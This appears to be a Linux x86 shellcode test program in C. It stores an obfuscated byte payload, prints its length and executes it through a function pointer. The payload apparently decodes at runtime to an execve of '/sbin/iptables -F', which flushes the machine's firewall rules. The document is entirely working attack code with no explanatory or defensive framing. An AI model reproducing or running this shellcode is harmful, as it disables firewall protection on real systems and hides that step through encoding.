#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xc0\x50\x66\x68\x2d\x46\x89\xe7\x50\xba\x9d\x93\x9a\x8c\xf7\xd2\x52\xba\x96\x06\x47\x17\xc1\xca\x04\x52\xb9\x96\xe6\xf6\x22\xc1\xc1\x04\x51\xba\xd0\xd0\xd0\x8c\xf7\xd2\x52\x89\xe3\x50\x57\x53\x89\xe1\x89\xc2\x0c\x0b\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
